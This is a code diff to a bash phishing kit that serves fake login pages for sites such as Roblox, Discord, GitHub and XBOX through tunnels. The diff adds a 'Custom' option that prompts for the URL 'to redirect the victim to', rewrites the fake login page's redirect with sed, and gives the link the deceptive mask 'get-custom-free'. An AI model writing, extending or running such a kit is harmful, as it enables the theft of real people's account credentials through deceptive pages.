@@ -733,6 +733,16 @@ site_vk() {
 	esac
 }
 
+## Custom
+site_custom() {
+	local file_path="./.sites/custom/login.php"
+    read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter the URL to redirect the victim to: ${BLUE}" user_url
+	if [[ ! "$user_url" =~ ^https:// && ! "$user_url" =~ ^http:// ]]; then
+        user_url="https://$user_url"
+    fi
+    sed -i "s|header('Location: https://www.google.com/404');|header('Location: $user_url');|" "$file_path"
+	tunnel_menu
+}
 ## Menu
 main_menu() {
 	{ clear; banner; echo; }
@@ -750,7 +760,7 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox       ${RED}[${WHITE}36${RED}]${ORANGE} Custom 
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -891,6 +901,10 @@ main_menu() {
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
+		36)
+			website="custom"
+			mask='https://get-custom-free'
+			site_custom;;
 		99)
 			about;;
 		0 | 00 )
